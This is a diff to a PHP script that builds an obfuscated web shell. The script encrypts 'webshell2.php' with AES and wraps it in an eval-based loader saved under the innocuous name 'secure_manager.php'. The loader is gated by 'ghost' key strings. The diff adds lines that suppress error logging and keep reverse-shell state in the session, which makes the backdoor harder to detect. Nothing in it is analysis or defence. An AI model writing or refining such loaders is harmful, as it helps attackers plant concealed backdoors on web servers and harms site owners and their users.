@@ -4,11 +4,11 @@
  * VERIFIED JSON PERSISTENCE
  */
 
-$source_file    = 'webshell2.php'; 
-$output_name    = 'secure_manager.php'; 
-$encryption_key = 'secretNNEA1rFUqyfgoY8zNYSkvefrsbmdDdixTApahs2WhkvKMCf7PQ2uobMP'; 
-$ghost_key      = 'PHPSSIDLOGINFODATARECOVESSRYSYSTEM'; 
-$ghost_val      = 'SYSTEM32LOGFILEINSTANCE'; 
+$source_file    = 'webshell2.php';
+$output_name    = 'secure_manager.php';
+$encryption_key = 'secretNNEA1rFUqyfgoY8zNYSkvefrsbmdDdixTApahs2WhkvKMCf7PQ2uobMP';
+$ghost_key      = 'PHPSSIDLOGINFODATARECOVESSRYSYSTEM';
+$ghost_val      = 'SYSTEM32LOGFILEINSTANCE';
 
 $code      = file_get_contents($source_file);
 $iv_len    = openssl_cipher_iv_length('aes-256-cbc');
@@ -21,6 +21,12 @@ $inner_loader = '
 @ini_set("session.use_cookies", 0);
 @ini_set("display_errors", 0);
 @ini_set("log_errors", 0);
+@ini_set("error_log", NULL);
+@header("Cache-Control: no-cache, no-store, must-revalidate");
+@header("Pragma: no-cache");
+@header("Expires: 0");
+@header("X-Content-Type-Options: nosniff");
+@header("X-Frame-Options: DENY");
 
 $payload = "' . $payload . '";
 $ghost_k = "' . $ghost_key . '";
@@ -45,17 +51,16 @@ $cipher = substr($raw, $iv_l);
 $dec = openssl_decrypt($cipher, "aes-256-cbc", $key, 0, $iv);
 
 if ($dec) {
+    if (session_status() == PHP_SESSION_NONE) @session_start();
+    if (!isset($_SESSION["reverse_shells"])) $_SESSION["reverse_shells"] = array();
+    if (isset($_SERVER["HTTP_X_STATE_CWD"]) && $_SERVER["HTTP_X_STATE_CWD"]) $_SESSION["current_dir"] = $_SERVER["HTTP_X_STATE_CWD"];
+    if (isset($_SERVER["HTTP_X_STATE_TCWD"]) && $_SERVER["HTTP_X_STATE_TCWD"]) $_SESSION["terminal_cwd"] = $_SERVER["HTTP_X_STATE_TCWD"];
+
     ob_start();
-    global $_SESSION;
-    $_SESSION = array(
-        "current_dir" => isset($_SERVER["HTTP_X_STATE_CWD"]) ? $_SERVER["HTTP_X_STATE_CWD"] : (isset($_COOKIE["v_cwd"]) ? $_COOKIE["v_cwd"] : ""), 
-        "terminal_cwd" => isset($_SERVER["HTTP_X_STATE_TCWD"]) ? $_SERVER["HTTP_X_STATE_TCWD"] : (isset($_COOKIE["v_tcwd"]) ? $_COOKIE["v_tcwd"] : ""), 
-        "reverse_shells" => array()
-    );
     unset($payload, $raw, $key, $cipher, $iv);
     eval("?>" . $dec);
     $output = ob_get_clean();
-    
+
     $is_dl = false;
     foreach(headers_list() as $h) {
         if (stripos($h, "Content-Disposition") !== false || stripos($h, "application/octet-stream") !== false) {
